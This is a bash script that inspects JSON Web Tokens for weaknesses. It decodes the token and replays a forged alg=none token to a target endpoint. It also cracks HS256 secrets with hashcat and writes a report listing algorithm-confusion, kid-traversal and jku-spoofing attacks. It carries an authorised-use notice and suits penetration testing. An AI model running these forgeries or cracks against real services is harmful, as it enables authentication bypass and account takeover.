#!/usr/bin/env bash
# jwt_inspect.sh — Detect JWTs and try common weaknesses.
#
# Checks:
#   1) Decode header + payload (alg, kid, jwk, etc.)
#   2) "alg=none" acceptance (forge a token, send it back)
#   3) HS256 weak secret crack with hashcat (mode 16500) on rockyou-style wordlist
#   4) Algorithm confusion (HS256 with public RS256 key — beyond bash, advise manually)
#
# Required: jq, openssl
# Recommended: hashcat, rockyou.txt

set -uo pipefail

LEGAL='
================ LEGAL NOTICE ================
This tool inspects JWTs and attempts secret cracking offline.
Use only on tokens issued by:
  (a) systems you own,
  (b) authorised targets,
  (c) self-hosted lab apps.
==============================================
'

TOKEN=""; ENDPOINT=""; OUT=""; WORDLIST=""; YES=0; CRACK=0
while [[ $# -gt 0 ]]; do
  case "$1" in
    -t|--token)     TOKEN="$2"; shift 2 ;;
    -e|--endpoint)  ENDPOINT="$2"; shift 2 ;;   # for alg=none retest
    -w|--wordlist)  WORDLIST="$2"; shift 2 ;;
    --crack)        CRACK=1; shift ;;
    -o|--out)       OUT="$2"; shift 2 ;;
    --yes)          YES=1; shift ;;
    -h|--help)      sed -n '2,16p' "$0"; exit 0 ;;
    *) shift ;;
  esac
done

[[ -z "$TOKEN" ]] && { echo "Usage: $0 -t <jwt> [--endpoint URL] [--crack -w wordlist.txt]"; exit 2; }
echo "$LEGAL"
[[ $YES -ne 1 ]] && { read -rp "Proceed? (yes/N) " a; [[ "$a" != yes ]] && exit 1; }

OUT="${OUT:-./jwt_$(date +%Y%m%d_%H%M%S)}"
mkdir -p "$OUT"
REPORT="$OUT/report.md"

have(){ command -v "$1" >/dev/null 2>&1; }

# Validate format
[[ "$TOKEN" =~ ^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*$ ]] || {
  echo "[!] Doesn't look like a JWT"; exit 2
}

IFS='.' read -r HEADER_B64 PAYLOAD_B64 SIG_B64 <<<"$TOKEN"

b64url_decode() {
  local s="$1"
  s="${s//-/+}"; s="${s//_//}"
  case $((${#s} % 4)) in 2) s="${s}==" ;; 3) s="${s}=" ;; esac
  echo -n "$s" | base64 -d 2>/dev/null
}

HEADER_JSON=$(b64url_decode "$HEADER_B64")
PAYLOAD_JSON=$(b64url_decode "$PAYLOAD_B64")
ALG=$(echo "$HEADER_JSON" | jq -r '.alg' 2>/dev/null)
TYP=$(echo "$HEADER_JSON" | jq -r '.typ // empty' 2>/dev/null)
KID=$(echo "$HEADER_JSON" | jq -r '.kid // empty' 2>/dev/null)
JKU=$(echo "$HEADER_JSON" | jq -r '.jku // empty' 2>/dev/null)
JWK=$(echo "$HEADER_JSON" | jq -r '.jwk // empty' 2>/dev/null)

echo "[*] Header decoded:"
echo "$HEADER_JSON" | jq .
echo "[*] Payload decoded:"
echo "$PAYLOAD_JSON" | jq .

# ---- Check 1: alg=none forge ------------------------------------------
NONE_RESULT="not tested"
if [[ -n "$ENDPOINT" ]]; then
  echo "[*] Forging alg=none token and replaying to endpoint ..."
  NEW_HEADER=$(echo "$HEADER_JSON" | jq '.alg="none"' | tr -d '\n' | base64 -w0 | tr '+/' '-_' | tr -d '=')
  NEW_TOKEN="${NEW_HEADER}.${PAYLOAD_B64}."
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" -H "Authorization: Bearer ${NEW_TOKEN}" "$ENDPOINT" 2>/dev/null)
  echo "    forged token HTTP code: $CODE"
  NONE_RESULT="HTTP $CODE (200/2xx = likely vulnerable; 401/403 = not)"
fi

# ---- Check 2: HS256 secret crack --------------------------------------
CRACK_RESULT="not attempted"
if [[ "$CRACK" -eq 1 && "$ALG" =~ HS(256|384|512) ]]; then
  if have hashcat; then
    [[ -z "$WORDLIST" ]] && WORDLIST="/usr/share/wordlists/rockyou.txt"
    if [[ ! -f "$WORDLIST" ]]; then
      echo "    !! wordlist not found at $WORDLIST"
      CRACK_RESULT="wordlist missing"
    else
      echo "[*] Cracking HS256 secret with hashcat (mode 16500) ..."
      HASH_FILE="$OUT/jwt.hash"
      echo "$TOKEN" > "$HASH_FILE"
      hashcat -m 16500 "$HASH_FILE" "$WORDLIST" --quiet --potfile-disable -o "$OUT/cracked.txt" 2>&1 | tail -10
      if [[ -s "$OUT/cracked.txt" ]]; then
        secret=$(awk -F: '{print $NF}' "$OUT/cracked.txt")
        CRACK_RESULT="CRACKED — secret: \`$secret\`"
      else
        CRACK_RESULT="not cracked with $WORDLIST"
      fi
    fi
  else
    CRACK_RESULT="hashcat not installed"
  fi
fi

# ---- Report -----------------------------------------------------------
{
  echo "# JWT Inspection Report"
  echo
  echo "_Generated: $(date -u '+%Y-%m-%dT%H:%M:%SZ')_"
  echo
  echo "## Token"
  echo
  echo '```'
  echo "$TOKEN"
  echo '```'
  echo
  echo "## Decoded"
  echo
  echo "**Header**:"
  echo '```json'
  echo "$HEADER_JSON" | jq . 2>/dev/null
  echo '```'
  echo
  echo "**Payload**:"
  echo '```json'
  echo "$PAYLOAD_JSON" | jq . 2>/dev/null
  echo '```'
  echo
  echo "## Algorithm summary"
  echo
  echo "| Field | Value | Note |"
  echo "|-------|-------|------|"
  echo "| alg | \`$ALG\` | $([[ "$ALG" == none ]] && echo '⚠️ none — forgery trivial' || echo '') |"
  echo "| typ | \`$TYP\` | |"
  echo "| kid | \`$KID\` | $([[ -n "$KID" ]] && echo 'check for SQLi/path traversal in kid resolver' || echo '') |"
  echo "| jku | \`$JKU\` | $([[ -n "$JKU" ]] && echo '⚠️ attacker may control jku URL → forge any signing key' || echo '') |"
  echo "| jwk | \`$JWK\` | $([[ -n "$JWK" ]] && echo '⚠️ key in header — verify server doesnt trust attacker-supplied' || echo '') |"
  echo
  echo "## Active checks"
  echo
  echo "| Check | Result |"
  echo "|-------|--------|"
  echo "| alg=none replay | $NONE_RESULT |"
  echo "| HS* secret crack | $CRACK_RESULT |"
  echo
  echo "## Manual checks worth running"
  echo
  echo "1. **Algorithm confusion (HS256 vs RS256)**: if the server expects RS256, get the public key (\`/.well-known/jwks.json\`), then re-sign the token with that public key as the HS256 secret. The server will verify with the same public key as if it were a shared secret. Many libs are vulnerable."
  echo "2. **kid injection**: if \`kid\` is used to look up keys in DB or filesystem, try \`kid=../../../dev/null\` (verifies with empty key) or SQLi payload."
  echo "3. **jku / x5u**: if attacker can control the URL the server fetches the verification key from, forge any token. Try setting \`jku\` to your domain serving a JWKS with your public key."
  echo "4. **JWE not JWS**: check whether tokens are encrypted; different attack surface."
  echo "5. **Token reuse**: same token across services / users? expiry honored? refresh-token rotation enforced?"
  echo
  echo "---"
  echo
  echo "_For real exploitation chains, use the \`jwt_tool\` Python utility (https://github.com/ticarpi/jwt_tool) which implements every known attack._"
} > "$REPORT"

echo
echo "[+] Done."
echo "    Report: $REPORT"
